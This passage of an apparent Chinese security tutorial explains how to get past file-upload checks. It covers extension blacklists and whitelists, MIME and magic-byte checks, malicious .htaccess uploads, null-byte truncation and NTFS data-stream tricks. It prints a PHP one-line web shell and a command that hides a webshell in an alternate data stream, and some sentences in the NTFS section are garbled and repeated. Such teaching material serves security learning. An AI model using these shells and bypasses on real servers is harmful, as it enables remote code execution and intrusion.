data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>并且修改后缀名为 jpg，上传操作，通过 burpsuit 抓包改包，使其后缀名修改回 php。</p><h2 id="服务器检测扩展名"><a class="anchor" href="#服务器检测扩展名">#</a> 服务器检测扩展名</h2><p>就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传<br>在检查扩展名是否合法的时候，有两种策略：</p><h3 id="黑名单策略"><a class="anchor" href="#黑名单策略">#</a> 黑名单策略</h3><p>文件扩展名在黑名单中的为不合法</p><p>示例：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.asp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.aspx'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 删除文件名末尾的点</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 转换为小写</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 去除字符串::$DATA</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 收尾去空</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            </pre></td></tr><tr><td data-num="16"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="白名单策略"><a class="anchor" href="#白名单策略">#</a> 白名单策略</h3><p>文件扩展名不在白名单中的均为不合法</p><p>示例：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_path'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="原理-2"><a class="anchor" href="#原理-2">#</a> 原理</h3><p>当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。</p><h3 id="绕过方法-2"><a class="anchor" href="#绕过方法-2">#</a> 绕过方法</h3><p>在一些 Web server 中，存在解析漏洞:</p><pre><code>1. 老版本的IIS6中的目录解析漏洞，如果网站目录中有一个 /.asp/目录，那么此目录下面的一切内容都会被当作asp脚本来解析

2. 老版本的IIS6中的分号漏洞：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容
来避免黑名单过滤，如 a.asp;jpg

3. 旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使
得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行

4. nginx(0.5.x, 0.6.x, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37)空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行
（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）

5. apache1.x,2.x的解析漏洞，上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析
文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，
从而达到了注入php代码的目的
</code></pre><h2 id="服务器检测mime"><a class="anchor" href="#服务器检测mime">#</a> 服务器检测 MIME</h2><p>原理 检查 Content-Type</p><p>HTTP 协议规定了上传资源的时候在 Header 中加上一项文件的 MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型不过这仍然是不安全的，因为 HTTP header 可以被发出者或者中间人任意的修改。</p><h3 id="常见类型"><a class="anchor" href="#常见类型">#</a> 常见类型</h3><table><tr><th>文件后缀</th><th>Mime类型</th><th>说明</th></tr><tr><td>.flv</td><td>flv/flv-flash</td><td>在线播放</td></tr><tr><td>.html或.htm</td><td>text/html</td><td>超文本标记语言文本</td></tr><tr><td>.rtf</td><td>application/rtf</td><td>RTF文本</td></tr><tr><td>.gif 或.png</td><td>image/gif(image/png)</td><td>GIF图形/PNG图片</td></tr><tr><td>.jpeg或.jpg</td><td>image/jpeg</td><td>JPEG图形</td></tr><tr><td>.au</td><td>audio/basic</td><td>au声音文件</td></tr><tr><td>.mid或.midi</td><td>audio/midi或audio/x-midi</td><td>MIDI音乐文件</td></tr><tr><td>.ra或.ram或.rm</td><td>audio/x-pn-realaudio</td><td>RealAudio音乐文件</td></tr><tr><td>.mpg或.mpeg或.mp3</td><td>video/mpeg</td><td>MPEG文件</td></tr><tr><td>.avi</td><td>video/x-msvideo</td><td>AVI文件</td></tr><tr><td>.gz</td><td>application/x-gzip</td><td>GZIP文件</td></tr><tr><td>.tar</td><td>application/x-tar</td><td>TAR文件</td></tr><tr><td>.exe</td><td>application/octet-stream</td><td>下载文件类型</td></tr><tr><td>.rmvb</td><td>video/vnd.rn-realvideo</td><td>在线播放</td></tr><tr><td>.txt</td><td>text/plain</td><td>普通文本</td></tr><tr><td>.mrp</td><td>application/octet-stream</td><td>MRP文件&#xff08;国内普遍的手机&#xff09;</td></tr><tr><td>.ipa</td><td>application/iphone-package-archive</td><td>IPA文件(IPHONE)</td></tr><tr><td>.deb</td><td>application/x-debian-package-archive</td><td>DED文件(IPHONE)</td></tr><tr><td>.apk</td><td>application/vnd.android.package-archive</td><td>APK文件(安卓系统)</td></tr><tr><td>.cab</td><td>application/vnd.cab-com-archive</td><td>CAB文件(Windows Mobile)</td></tr><tr><td>.xap</td><td>application/x-silverlight-app</td><td>XAP文件(Windows Phone 7)</td></tr><tr><td>.sis</td><td>application/vnd.symbian.install-archive</td><td>SIS文件(symbian平台)</td></tr><tr><td>.jar</td><td>application/java-archive</td><td>JAR文件(JAVA平台手机通用格式)</td></tr><tr><td>.jad</td><td>text/vnd.sun.j2me.app-descriptor</td><td>JAD文件(JAVA平台手机通用格式)</td></tr><tr><td>.sisx</td><td>application/vnd.symbian.epoc/x-sisx-app</td><td>SISX文件(symbian平台)</td></tr></table><h3 id="绕过方法-3"><a class="anchor" href="#绕过方法-3">#</a> 绕过方法</h3><p>使用各种各样的工具（如 burpsuite）强行篡改 Header 就可以，将 Content-Type: application/php 改为其他 web 程序允许的类型。</p><h2 id="文件头检查文件"><a class="anchor" href="#文件头检查文件">#</a> 文件头检查文件</h2><p>原理:<br>利用的是每一个特定类型的文件都会有不太一样的开头或者标志位。</p><h3 id="常见格式"><a class="anchor" href="#常见格式">#</a> 常见格式</h3><table><tr><th align="left">格式</th><th align="left">文件头</th></tr><tr><td align="left">TIFF (tif)</td><td align="left">49492A00</td></tr><tr><td align="left">Windows Bitmap (bmp)</td><td align="left">424D</td></tr><tr><td align="left">CAD (dwg)</td><td align="left">41433130</td></tr><tr><td align="left">Adobe Photoshop (psd)</td><td align="left">38425053</td></tr><tr><td align="left">JPEG (jpg)</td><td align="left">FFD8FF</td></tr><tr><td align="left">PNG (png)</td><td align="left">89504E47</td></tr><tr><td align="left">GIF (gif)</td><td align="left">47494638</td></tr><tr><td align="left">XML (xml)</td><td align="left">3C3F786D6C</td></tr><tr><td align="left">HTML (html)</td><td align="left">68746D6C3E</td></tr><tr><td align="left">MS Word/Excel (xls.or.doc)</td><td align="left">D0CF11E0</td></tr><tr><td align="left">MS Access (mdb)</td><td align="left">5374616E64617264204A</td></tr><tr><td align="left">ZIP Archive (zip)，</td><td align="left">504B0304</td></tr><tr><td align="left">RAR Archive (rar)，</td><td align="left">52617221</td></tr><tr><td align="left">Wave (wav)，</td><td align="left">57415645</td></tr><tr><td align="left">AVI (avi)，</td><td align="left">41564920</td></tr><tr><td align="left">Adobe Acrobat (pdf)，</td><td align="left">255044462D312E</td></tr></table><h3 id="绕过方法-4"><a class="anchor" href="#绕过方法-4">#</a> 绕过方法</h3><p>给上传脚本加上相应的幻数头字节就可以，php 引擎会将 &lt;? 之前的内容当作 html 文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：<br>（一般不限制图片文件格式的时候使用 GIF 的头比较方便，因为全都是文本可打印字符。）</p><h2 id="限制web-server对特定类型文件的行为htaccess文件攻击"><a class="anchor" href="#限制web-server对特定类型文件的行为htaccess文件攻击">#</a> 限制 Web Server 对特定类型文件的行为 (.htaccess 文件攻击)</h2><h3 id="原理-3"><a class="anchor" href="#原理-3">#</a> 原理</h3><p>导致文件上传漏洞的根本原因在于服务把用户上传的本应是数据的内容当作了代码，一般而言：用户上传的内容都会被存储到特定的一个文件夹下，比如我们很多人习惯于放在 ./upload/ 下面要防止数据被当作代码执行，我们可以限制 web server 对于特定文件夹的行为。</p><p>大多数服务端软件都可以支持用户对于特定类型文件的行为的自定义，以 Apache 为例：</p><blockquote><p>在默认情况下，对与 .php 文件 Apache 会当作代码来执行，对于 html,css,js 文件，则会直接由 HTTP Response 交给客户端程序对于一些资源文件，比如 txt，doc，rar 等等，则也会以文件下载的方式传送的客户端。我们希望用户上传的东西仅仅当作资源和数据而不能当作代码。因此 Apache 使用服务器程序的接口来进行限制利用 .htaccess 文件机制来对 web server 行为进行限制。<br>禁止脚本执行有多种方式可以实现，而且分别有不同的效果：</p></blockquote><p>指定特定扩展名的文件的处理方式，原理是指定 Response 的 Content-Type 可以加上如下几行</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>AddType text/plain .pl .py .php</pre></td></tr></table></figure><p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的 Content-Type</p><p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的 Content-Type</p><p>如果要完全禁止特定扩展名的文件被访问，用下面的几行</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>Options -ExecCGI</pre></td></tr><tr><td data-num="2"></td><td><pre>AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别</pre></td></tr></table></figure><p>在这种情况下，以上几种类型的文件被访问的时候，会返回 403 Forbidden 的错误</p><p>强制 web 服务器对于特定文件类型的处理，与第一条不同的是， 下面的方法直接强行让 apache 将文件识别为你指定的类型，而第一种是让浏览器符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型。</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span>FilesMatch <span class="token string">"\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$"</span><span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre>ForceType text/plain</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">&lt;</span>/FilesMatch<span class="token operator">></span></pre></td></tr></table></figure><p>只允许访问特定类型的文件。使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问 (白名单策略)。</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span>Files ^<span class="token punctuation">(</span>*.jpeg<span class="token operator">|</span>*.jpg<span class="token operator">|</span>*.png<span class="token operator">|</span>*.gif<span class="token punctuation">)</span><span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre>order deny,allow</pre></td></tr><tr><td data-num="3"></td><td><pre>deny from all</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">&lt;</span>/Files<span class="token operator">></span></pre></td></tr></table></figure><h3 id="绕过方法-5"><a class="anchor" href="#绕过方法-5">#</a> 绕过方法</h3><p>可以通过 move_uploaded_file 函数把自己写的.htaccess 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限。</p><p>补充知识 htaccess：</p><blockquote><p>.htaccess 文件 (或者 &quot;分布式配置文件&quot;）, 全称是 Hypertext Access (超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。概述来说，htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许 / 阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p></blockquote><hr><p>这里还有一种</p><p>如果 PHP 安全没配置好就可以通过 move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的，这样就能任意定义解析名单了。<br>来做个小实验，先描述下效果：</p><blockquote><p>通过一个.htaccess 文件调用 php 的解析器去解析一个文件名中只要包含 &quot;haha&quot; 这个字符串的任意文件，所以无论文件名是什么样子，只要包含 &quot;haha&quot; 这个字符串，都可以被以 php 的方式来解析，是不是相当邪恶，一个自定义的.htaccess 文件就可以以各种各样的方式去绕过很多上传验证机制建一个.htaccess 文件，里面的内容如下</p></blockquote><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span>FilesMatch <span class="token string">"haha"</span><span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre>    SetHandler application/x-httpd-php</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">&lt;</span>/FilesMatch<span class="token operator">></span></pre></td></tr></table></figure><h2 id="文件系统00截断"><a class="anchor" href="#文件系统00截断">#</a> 文件系统 00 截断</h2><p>00 截断的条件 (过气了)</p><pre><code class="language-txt">1.  php版本小于5.3.4
2.  php的magic\_quotes\_gpc为OFF状态
</code></pre><h3 id="原理-4"><a class="anchor" href="#原理-4">#</a> 原理</h3><p>** 在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。** 利用 00 截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生 0x00、%00 上传截断漏洞。</p><h3 id="绕过方法-6"><a class="anchor" href="#绕过方法-6">#</a> 绕过方法</h3><p>通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。</p><h2 id="7windows-ntfs文件系统特性绕过"><a class="anchor" href="#7windows-ntfs文件系统特性绕过">#</a> 7.windows NTFS 文件系统特性绕过</h2><p>NTFS 交换数据流（alternate data streams 简称 ADS）是 NTFS 磁盘格式的新特性，见漏洞详细可查 CVE-1999-0278。</p><p><img data-src="image006.png" alt=""></p><p>一个完整的流的格式为：::<br>文件主流即我们平时可以看见的可以存储数据的文件。而非主文件流寄宿于主文件流中，无法直接读取。<br>修改宿主文件的内容或流的内容，不会对彼此造成影响。<br>流类型总是以符 号 作 为 开 始 ， N T F S 文 件 系 统 中 的 文 件 至 少 包 含 一 个 主 流 ， 也 就 是 d a t a 流 (符号作为开始，NTFS 文件系统中的文件至少包含一个主流，也就是 data 流 (符号作为开始，NTFS 文件系统中的文件至少包含一个主流，也就是 data 流 (DATA)，默认流名为空。<br>ADS 可以省略流名，但不能省略流类型。<br>NTFS 文件系统中的文件夹没有 data 流，但可以指派 data 流，文件夹的主流为 directory 流 (I N D E X A L L O C A T I O N) ， 流 名 默 认 为 INDEX_ALLOCATION)，流名默认为 INDEX A LLOCATION)，流名默认为 I30<br>当我们对一个在 NTFS 分区中的 ASP 文件发出包含 D A T A 请 求 ， I I S 会 检 查 最 后 一 个 “.” 后 面 的 扩 展 名 ， 因 为 多 了 : : DATA 请求，IIS 会检查最后一个 “.” 后面的扩展名，因为多了::DATA 请求，IIS 会检查最后一个 “.” 后面的扩展名，因为多了::DATA，结果 IIS 不认为这是一个 ASP 文件，而文件系统可以识别该请求，于是返回 ASP 的源代码。</p><h3 id="绕过方法-7"><a class="anchor" href="#绕过方法-7">#</a> 绕过方法</h3><ol><li>IIS 目录访问权限绕过：在 IIS6.0+PHP、IIS7+asp、IIS7.5+php 的环境下，如果目录是通过 HTTP Basic 来认证，假设网站根目录存在 index.php 文件，可通过构造如下方式来绕过认证直接访问目录下的文件。</li></ol><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>/admin::<span class="token variable">$INDEX_ALLOCATION</span>/index.php</pre></td></tr><tr><td data-num="2"></td><td><pre>/admin:<span class="token variable">$i30</span><span class="token builtin class-name">:</span><span class="token variable">$INDEX_ALLOCATION</span>/index.asp</pre></td></tr></table></figure><ol start="2"><li>上传绕过黑名单：在测试中我们发现如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个 test.php 的文件，其中内容和所上传文件内容相同，并被解析。</li></ol><table><tr><th>上传的文件名</th><th>服务器表面现象</th><th>生成的文件内容</th></tr><tr><td>Test.php:a.jpg</td><td>生成Test.php</td><td>空</td></tr><tr><td>Test.php::$DATA</td><td>生成test.php</td><td>&lt;?php phpinfo();?&gt;</td></tr><tr><td>Test.php::$INDEX_ALLOCATION</td><td>生成test.php文件夹</td><td></td></tr><tr><td>Test.php::$DATA\0.jpg</td><td>生成0.jpg</td><td>&lt;?php phpinfo();?&gt;</td></tr><tr><td>Test.php::$DATA\aaa.jpg</td><td>生成aaa.jpg</td><td>&lt;?php phpinfo();?&gt;</td></tr></table><pre><code class="language-txt">注意：
对于windows环境的服务器，上传test.php:.jpg类型的文件，当文件传到服务端时，windows会将该文件识别成ADS，
从而认为其宿主文件名为1.asp而将.jpg识别为流名。
通过notepad test.php:.jpg可以查看内容，所以test.php内容为空是正常的。
然后修改上传的文件名为test.&gt;&gt;&gt;或者test.&lt;、test.&lt;&lt;&lt;、test.&gt;&gt;&lt;再上传，会重写test.php。
原因是在PHP+IIS的环境下，&quot; 同义. &gt;同义? &lt;同义*
</code></pre><ol start="3"><li>隐藏 webshell：</li></ol><p>在服务器上 echo 一个数据流文件进去，比如 index.php 是网页正常文件，命令如下：<br><code>echo ^&lt;?php @eval(request[cmd])?^ &gt;&gt; index.php:hidden.jpg</code><br>这样生成了一个不可见的 shell hidden.jpg，type dir del 命令都不行。利用文件包含<?php include('shell.php:hidden.jpg')?>就是一句话。</p><ol start="4"><li>mysql 中的 udf 提权:</li></ol><pre><code class="language-txt">如果数据库用户对数据库mysql（注意指的是数据库里的默认库mysql）具有insert和delete权限，就可以创建加载自定义函数。
而又因为mysql服务是以system权限运行在windows主机上，所以这个时候我们就可以通过自定义函数以system权限执行命令了。
